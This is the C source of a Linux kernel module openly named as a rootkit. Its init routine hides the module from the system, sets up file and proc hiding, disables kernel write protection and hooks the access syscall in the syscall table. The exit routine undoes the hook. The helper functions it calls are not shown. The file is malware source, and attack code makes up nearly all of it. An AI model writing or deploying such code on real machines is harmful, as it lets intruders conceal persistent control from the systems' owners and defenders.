#include "main.h"

static unsigned long *syscall_table;
sys_call_ptr_t orig_access;

static int __init lkm_rootkit_init(void)
{
    printk(KERN_INFO "Hello, World!\n");

    if (proc_init() || hidefs_init())
    {
        proc_clean();
        hidefs_clean();
        return -1;
    }

    module_hide();

    syscall_table = find_syscall_table();
    pr_info("Found syscall_table at %lx\n", *syscall_table);

    orig_access = (sys_call_ptr_t)syscall_table[__NR_access];

    disable_write_protect();

    syscall_table[__NR_access] = (unsigned long)rk_access;

    enable_write_protect();

    return 0;
}

static void __exit lmk_rootkit_exit(void)
{
    proc_clean();
    hidefs_clean();

    disable_write_protect();

    syscall_table[__NR_access] = (unsigned long)orig_access;

    enable_write_protect();

    printk(KERN_INFO "Goodbye, World!\n");
}
